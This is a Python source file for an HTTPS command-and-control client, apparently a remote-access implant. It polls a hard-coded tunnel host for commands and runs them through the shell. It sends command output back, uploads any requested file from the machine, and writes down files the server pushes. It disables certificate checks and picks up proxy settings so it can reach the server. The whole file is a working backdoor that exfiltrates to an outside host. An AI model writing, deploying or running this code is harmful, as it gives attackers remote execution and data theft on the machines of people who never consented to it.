# httpsclient.py

from urllib import request, parse
import subprocess
import time
import os
from http.client import RemoteDisconnected
import ssl
import platform

class Client:
    def __init__(self, server_ip, https_port):
        self.server_ip = server_ip
        self.https_port = https_port
        self.proxy = self.get_proxy_settings()

    # Function to detect the OS and check for proxy settings
    def get_proxy_settings(self):
        os_type = platform.system()
        proxy = None

        if os_type == "Windows":
            # Check for proxy settings in the environment variables
            proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
        elif os_type == "Linux" or os_type == "Darwin":  # Darwin is macOS
            # Check for proxy settings in the environment variables
            proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
        
        return proxy

    # Data is a dict
    def send_post(self, data, url, verify_ssl=False):   # Changed to True
        data = {"rfile": data}
        data = parse.urlencode(data).encode()
        req = request.Request(url, data=data)
        
        # Create an SSL context
        context = ssl.create_default_context()
        
        # If verify_ssl is False, disable certificate verification
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

        # Set proxy if available
        if self.proxy:
            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            opener = request.build_opener(proxy_handler)
            request.install_opener(opener)

        try:
            request.urlopen(req, context=context)  # Send request
        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
            print(f"Error sending data: {e}")
            print("Connection closed, exiting...")
            exit(1)

    def send_file(self, command, verify_ssl=False):
        try:
            getfile, path = command.strip().split(' ')
        except ValueError:
            self.send_post("[-] Invalid getfile command (maybe multiple spaces)", url=f'https://{self.server_ip}:{self.https_port}/store', verify_ssl=False)
            return

        if not os.path.exists(path):
            self.send_post("[-] Not able to find the file", url=f'https://{self.server_ip}:{self.https_port}/store', verify_ssl=False)
            return

        store_url = f'https://{self.server_ip}:{self.https_port}/store'  # Posts to /store
        with open(path, 'rb') as fp:
            try:
                file_data = fp.read()
                req = request.Request(store_url, data=file_data)
                req.add_header('X-File-Name', os.path.basename(path))  # Send the file name in the header
                # Create an SSL context
                context = ssl.create_default_context()
                # If verify_ssl is False, disable certificate verification
                if not verify_ssl:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE                
                request.urlopen(req, context=context)  # Send the request with SSL context
            except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
                print(f"Error sending file: {e}")
                print("Connection closed, exiting...")
                exit(1)

    def run_command(self, command):
        if command.startswith("getfile"):
            _, file_name = command.split(maxsplit=1)
            self.send_file(file_name, verify_ssl=False)
            return

        # Execute the command
        CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    
        # Read the output and error
        stdout, stderr = CMD.communicate()
    
        # Combine stdout and stderr
        combined_output = stdout + stderr
    
        # Debugging output
        print(f"Command: {command}")
        print(f"STDOUT: {stdout.decode()}")
        print(f"STDERR: {stderr.decode()}")

        # Send the output to the server
        if stdout:
            self.send_post(stdout, url=f'https://{self.server_ip}:{self.https_port}/command_output', verify_ssl=False)
        if stderr:
            self.send_post(stderr, url=f'https://{self.server_ip}:{self.https_port}/command_output', verify_ssl=False)

    def connect_to_server(self, verify_ssl=False):  # Changed to True
        # Create an SSL context
        context = ssl.create_default_context()
        
        # If verify_ssl is False, disable certificate verification
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

        # Set proxy if available
        if self.proxy:
            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            opener = request.build_opener(proxy_handler)
            request.install_opener(opener)

        # Try connecting to the HTTPS server
        try:
            response = request.urlopen(f"https://{self.server_ip}:{self.https_port}", context=context)
            content_disposition = response.headers.get('Content-Disposition')
    
            # Check if the response is a file
            if content_disposition and 'attachment' in content_disposition:
                file_name = content_disposition.split('filename=')[1].strip('"')
                with open(file_name, 'wb') as output_file:
                    output_file.write(response.read())
                print(f"Downloaded file: {file_name} to {os.getcwd()}")
                return  # Return to continue the loop

            command = response.read().decode()
            return command
        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
            print(f"Error connecting to HTTPS server: {e}")
            return  # Return to continue the loop

    def start(self):
        # Main loop
        while True:
            command = self.connect_to_server()
        
            # If connection fails
            if command is None:
                print("HTTPS server is down, retrying...")
                time.sleep(5)  # Wait before retrying
                continue  # Continue the loop

            if 'terminate' in command:
                print("Termination command received, exiting...")
                break

            # Send file
            if 'getfile' in command:
                self.send_file(command)
                continue

            self.run_command(command)
            time.sleep(1)

# Instantiate and start the client
if __name__ == "__main__":
    client = Client(server_ip='568wmhcv-80.inc1.devtunnels.ms', https_port=443)  # You can change the IP and port if needed
    client.start()
